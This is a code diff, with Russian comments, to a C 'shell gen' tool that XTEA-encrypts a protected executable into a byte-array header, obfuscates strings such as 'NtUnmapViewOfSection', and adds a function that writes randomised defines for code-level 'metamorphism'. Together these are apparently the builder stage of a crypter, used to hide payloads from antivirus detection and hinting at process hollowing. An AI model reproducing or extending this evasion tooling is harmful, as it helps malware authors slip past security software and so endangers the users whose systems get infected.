@@ -8,6 +8,7 @@
 #define PATH_FILE_OPEN "data_protect.exe"
 #define PATH_FILE_HEX "../../modules/data_protect.h"
 #define PATH_FILE_HEX_STRING "../../modules/data_crypt_string.h"
+#define PATH_FILE_H "../../modules/metamorph_code/config.h"
 #define SIZE_FILE 50*1024*1024
 
 //Нужен для дебага
@@ -132,7 +133,6 @@ static void bin_to_hex_gen(void)
 	memcpy(buffer + 4, &size_file, sizeof(int));
 
 	//Шифрование защищаемых данных и генерация пошифрованного массива байт в заголовке ../../modules/data_protect.h
-
 	XTEA_encrypt((char*)(buffer + 8), size_file, pass, sizeof(pass));
 
 	fprintf(hFileHex, "uint8_t data_protect[] = { \n");
@@ -160,10 +160,42 @@ static void bin_to_hex_gen(void)
 	str_to_crypt("NtUnmapViewOfSection", "NtUnmapView");
 }
 
+/*
+Функция запишет дефайны в файл "../../modules/metamorph_code/config.h"
+Дефайны сгенерируются в случайном порядке, тем-самым обеспечится "метаморфизм" на уровне кода
+*/
+static void hpp_gen(void)
+{
+	FILE *hFileHex;
+	hFileHex = fopen(PATH_FILE_H, "wb+");
+
+	if (hFileHex == NULL)
+	{
+		printf("Error open files %s \n", PATH_FILE_H);
+		while (1);
+	}
+
+	uint32_t start_morph = do_Random_EAX(1, 11);
+	uint32_t end_morph   = do_Random_EAX(3, 14);
+
+	static char str_start_morph[256];
+	static char str_end_morph[256];
+
+	sprintf(str_start_morph, "#define START_MORPH_CODE %d\n", start_morph);
+	sprintf(str_end_morph,   "#define END_MORPH_CODE %d\n", end_morph);
+
+	fprintf(hFileHex, "#pragma once \n");
+	fprintf(hFileHex, str_start_morph);
+	fprintf(hFileHex, str_end_morph);
+
+	fclose(hFileHex);
+}
+
 int main()
 {
 	printf("Start shell gen \n");
 	bin_to_hex_gen();
+	hpp_gen();
 	printf("Shell gen is OK\n");
 	while (1);
 	return 0;
